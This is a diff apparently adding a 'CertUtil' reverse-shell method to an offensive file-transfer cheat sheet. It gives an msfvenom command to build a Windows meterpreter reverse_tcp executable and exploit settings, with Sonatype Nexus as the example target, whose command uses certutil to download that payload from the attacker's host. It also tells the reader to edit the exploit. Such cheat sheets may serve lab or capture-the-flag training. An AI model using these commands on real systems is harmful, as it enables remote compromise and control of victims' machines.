@@ -305,6 +305,29 @@ On **TARGET**:
 # socat TCP4:<LHOST>:<LPORT> file:<FILE_NAME>, create
 ```
 
+##
+
+### Method 11 (CertUtil) | Linux -> Windows
+
+***Direct reverse shell:***
+
+On **LOCAL**:
+
+```
+# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILENAME>.exe
+``` 
+
+On **TARGET** ***e.g. Sonatype Nexus***:
+
+```
+URL='http://<RHOST>:8081'
+CMD='cmd.exe /c certutil -urlcache -split -f http://<LHOST>/<FILENAME>.exe <FILENAME>.exe'
+USERNAME='<USERNAME>'
+PASSWORD='<PASSWORD>'
+```
+
+***Don't forget to modify the exploit again.***
+
 -------------------------------------------------------------
 
 ### File Servers
